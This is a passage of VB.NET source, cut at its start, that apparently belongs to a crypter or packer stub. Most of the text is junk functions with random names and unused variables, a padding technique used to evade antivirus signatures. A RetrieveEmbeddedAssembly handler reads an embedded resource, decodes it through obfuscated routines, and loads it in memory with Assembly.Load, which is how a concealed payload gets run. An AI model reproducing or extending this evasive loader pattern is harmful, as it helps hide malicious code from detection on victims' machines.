        Dim LhRnlBov As Object = {}
        Dim qdyIyWgn As String = "VYgdLrXe"
        Return "OoXOCymI"
    End Function

    Public Shared Function tkFjPSeA()
        Dim pFLILWqx As Long = 484
        Dim iWCtBdFb As Long = 224
        Dim NRkOOyxT As Object = {}
        Dim sNSjbToK As String = "XIAEoogC"
        Dim DDhYBJXu As Object = {}
        Dim vUYJsQnX As String = "bPGeFleP"
        Dim GLozSGWH As Integer = 421
        Dim lGVUfbNz As Object = {}
        Dim eXMFWicc As Long = 768
        Dim JSuajDUU As Object = {}
        Dim oNcvwYMM As String = "TJKPJtDD"
        Return "yErkWOvv"
    End Function

    Public Shared Function rViVNUKZ()
        Dim rXYIYUM As Object = {}
        Dim VZOEbQg As Object = {}
        Dim pCDecWH As Integer = 997
        Dim oJKGSxk As Object = {}
        Dim bziyskq As Object = {}
        Dim MQkvcZH As Long = 69
        Dim HhAPZEc As String = "gsQKiFp"
        Dim chTeTjA As Long = 510
        Return "rVQxcuT"
    End Function

    Public Shared Function qSZseUc()
        Dim gyXmXfS As Object = {}
        Dim nhYplyK As Object = {}
        Dim ORJejxM As Integer = 997
        Dim YOgvyNZ As Object = {}
        Dim mAvUFZt As Object = {}
        Dim OSSpeXF As Long = 69
        Dim RqeYYuB As String = "AsKJHmy"
        Dim WdFJZpX As Long = 510
        Return "qoeQBvJ"
    End Function

    Public Shared Function jVbJWcV()
        Dim XKqqAoh As Object = {}
        Dim ZaufSLK As Object = {}
        Dim uwTSiQQ As Integer = 997
        Dim cFOpBJjGv As Object = {}
        Dim lxnqXZLXo As Object = {}
        Dim bSeshKoTz As Long = 69
        Dim FPUYpFZsx As String = "xrSBPnBBX"
        Dim SSpFasrob As Long = 510
        Return "yxRSJnlBw"
    End Function

    Public Shared Function UnLjWqvOu()
        Dim QtULkuCOj As Integer = 153
        Dim XLYSQNqGk As String = "AQekKKwtN"
        Dim LpoRGZjyd As String = "eYcICguyL"
        Dim bAPZIJzGW As Object = {}
        Dim jdRMbbHwV As String = "pgxGFwaNb"
        Dim voCgxPuGe As Long = 49
        Dim UERrzQstU As String = "ivfgAcwJx"
        Dim KSBSTatJD As Long = 1
        Dim dJFvAiaXR As Object = {}
        Dim riEQctobR As Object = {}
        Dim yTWqhNSfv As Integer = 441
        Dim jpYELCUcV As Integer = 602
        Dim ajkAKkmyZ As Object = {}
        Dim RxLQiTugF As Long = 95
        Return "ewqsVhUKN"
    End Function

    Public Shared Function YQXiKNaFI()
        Dim HQuHwdevN As Integer = 153
        Dim aelkQkBzA As String = "dxyDQHNrQ"
        Dim vqtSIPwzIAC As String = "TTXgqRzzCxV"
        Dim wddPdOqlEgR As Object = {}
        Dim YFyRqMWkiEu As String = "YMFtgmzRKOm"
        Dim VtsafPoYuKA As Long = 49
        Dim HBemeDjIRuP As String = "qsLpZuMhaPp"
        Dim RnuLKtitiay As Long = 1
        Dim oYpMdwIHHWG As Object = {}
        Dim jfHznbIpzGp As Object = {}
        Dim KPsolaKCIcG As Integer = 441
        Dim bTMUwjxeaml As Integer = 602
        Dim XIPohNIzpin As Object = {}
        Dim bONDDjNfBSp As Long = 95
        Return "urBdEqogLpy"
    End Function


    Private Shared Function RetrieveEmbeddedAssembly(sender As Object, args As System.ResolveEventArgs) As System.Reflection.Assembly
        'get the root namespace (im tired of manually adding this)
        Dim vHzamptehzm = aOnnilxBdEp()

        Dim asm As Reflection.[Assembly] = System.Reflection.Assembly.GetEntryAssembly
        Dim RootNamespace As String = Strings.Left(asm.EntryPoint.DeclaringType.Namespace, asm.EntryPoint.DeclaringType.Namespace.ToString().IndexOf(".") + 1)
        'fuck ya! Im done manually adding that shit!!!
        Dim resourceName As String = RootNamespace + New Reflection.AssemblyName(args.Name).Name + ".dll"
        Dim MTIJDyRxCV = JdpSgAZbny()

        'resourceName = "dll.dll"
        Dim TPoTcPh = vFYYTOT()

        Using stream = Reflection.Assembly.GetExecutingAssembly.GetManifestResourceStream(resourceName)
            Dim KAcSTAP = nPhRAwp()


            Dim XiaCwl = Pptqfu()

            Dim assemblyData = New Byte(stream.Length - 1) {}
            Dim ElphFE = CGVXWH()

            'decode assembly here
            Dim KxtFFywn = TBYxKp()


            stream.Read(assemblyData, 0, assemblyData.Length)
            Dim bXSJohQt = PRfGMtNi()

            assemblyData = HWFTsAbAgD(hIzTmZWutO(assemblyData))
            Return Reflection.Assembly.Load(assemblyData)

            Dim hLihAbpXQf = PJXMktudBK()

        End Using ' stream
    End Function
    Public Shared Function aOnnilxBdEp()
        Dim IMcSSCDHPjH As Long = 336
        Dim TjVdXREwZII As Long = 444
        Dim QFJejuYFLPe As Object = {}
        Dim xhUUcnhDaMR As Long = 467
        Dim TkdpTrwecxF As String = "lWiBGzttQSD"
        Dim KgywOAHhicq As Object = {}
        Dim QMRGZUBmnYX As String = "uOGCbQWKJJe"
        Dim FtPASfsOygU As Long = 775
        Dim GrGpWFzhvrY As String = "lbhRAzespnz"
        Dim OnenzwVYVNo As Integer = 433
        Dim fgzmXFoBpib As Long = 522
        Dim VoblBoMkwr As Long = 656
        Dim wqSidNLcfN As String = "LIJdPyxzEg"
        Dim VMpVUpmwyB As Integer = 406
        Dim ShULlrOXhT As Long = 486
        Dim JoozTAtZln As Object = {}
        Dim pLIkNULFeF As Object = {}
        Dim PVPUavgLsZ As Long = 48
        Dim PaOkUuQKRu As Long = 418
        Dim XmKPKnbVqO As Long = 837
        Return "TPGrMqYLEe"
    End Function

    Public Shared Function JdpSgAZbny()
        Dim kkfgBZISvo As Integer = 821
        Dim jxvigaOfzH As Integer = 217
        Dim cvykeiXSYd As String = "JLBjmBTkmw"
        Dim xiBwsMqOAO As String = "zfkaALEzuk"
        Dim WEYijoQiTC As Object = {}
        Dim GEvIWEVXXY As Object = {}
        Dim LgXMizXLGp As Long = 98
        Dim diihyhRFUK As String = "CsqRLHmLje"
        Dim QSyxjtuwmv As String = "YetdZlFHLP"
        Dim HmhoxDfLuj As String = "xAQPRNgbdD"
        Dim NLrXSwvjXW As String = "lcPtQYmEQp"
        Dim aAFtgjK As Object = {}
        Dim ADFBDjD As Integer = 822
        Dim euwRSfD As Object = {}
        Dim JwmNVaX As Long = 214
        Dim caanWhz As Long = 941
        Dim bhiOMHc As Integer = 956
        Dim BCwqIIK As Long = 648
        Return "lSzosxb"
    End Function

    Public Shared Function vFYYTOT()
        Dim CjiXjHU As Long = 5
        Dim ftoFWEK As String = "QUokutv"
        Dim ANDirjX As Long = 990
        Dim FBmenEm As String = "bEwyfIC"
        Dim oTYXzVg As String = "LmEEsYQ"
        Dim ZYTczkl As Object = {}
        Dim nVhiuwZ As Long = 886
        Return "EOChSFs"
    End Function

    Public Shared Function nPhRAwp()
        Dim QqtISTd As Long = 5
        Dim JYqCmAp As String = "RdeFmSX"
        Dim xNFiQNB As Long = 990
        Dim JRiawaM As String = "hUqbcb"
        Dim rFHAIR As String = "cnPGVg"
        Dim UbUbfo As Object = {}
        Dim nLQcWV As Long = 886
        Return "OCJtKv"
    End Function

    Public Shared Function Pptqfu()
        Dim HYzuvC As Object = {}
        Dim kyLlMZ As Long = 271
        Dim BrXZoH As String = "NUXMjw"
        Dim NPYwpw As String = "saDOkR"
        Return "aXstUi"
    End Function

    Public Shared Function CGVXWH()
        Dim OXFGmu As Object = {}
        Dim NZWcdw As Long = 271
        Dim FObxnD As String = "YyXzel"
        Dim ypQPRK As String = "AbBMmJ"
        Return "uAYIZO"
    End Function

    Public Shared Function TBYxKp()
        Dim WDfIhmzx As Long = 674
        Dim UnIufofW As Integer = 436
        Dim gtvxGcjh As String = "szhAiQms"
        Dim rkKngRSQ As String = "DqwqIFVb"
        Dim PwjtktZm As Integer = 699
        Dim bCVwMhcw As Object = {}
        Dim ZnyiKjIV As Integer = 897
        Dim ltllmXLg As Long = 476
        Dim xzXoOLPq As String = "vjAbMNuP"
        Dim HpmeoBya As String = "TvZhQpBk"
        Return "RgCTOrhJ"
    End Function

    Public Shared Function PRfGMtNi()
        Dim ndEMQVUE As Long = 674
        Dim mOhzOXAc As Integer = 436
        Dim yUTCqLDn As String = "KaGFRzGy"
        Dim WfsItmKI As String = "UQVuroph"
        Dim gWIxTcts As Integer = 699
        Dim scuAvQwC As Object = {}
        Dim qNXntScb As Integer = 897
        Dim CTJqVGfm As Long = 476
        Dim OZwtxujw As String = "afiwZimH"
        Dim YQLiXkSg As String = "ahYilioAOX"
        Return "XCEYBkPbxp"
    End Function

    Public Shared Function PJXMktudBK()
        Dim UqzhqnhPJw As String = "UvyxknROiQ"
        Dim cHtcagcZHk As Object = {}
        Dim KPhoyxCdqE As String = "AdQPSHDtZY"
        Dim RorWTrTBSs As Integer = 63
        Dim pFPtRSJWMK As Long = 598
        Dim oSfwwTPjQe As Integer = 700
        Dim vmqNYNwITw As Integer = 388
        Dim cBuMggsaiP As Long = 800
        Dim DDlJIFrSRl As Long = 146
        Dim EAUnQEFDLH As String = "NEzfVvuAFc"
        Dim LZfVmxWbou As Object = {}
        Dim CgyJVGBdsP As Integer = 858
        Dim iDSuPaTJlg As Integer = 723
        Dim HNZebAoPzA As Integer = 535
        Dim ISZuVAYOYV As String = "PeUZLsjZxp"
        Dim MHQCNwgPLG As Object = {}
        Return "CVAchGheuZ"
    End Function



End Class
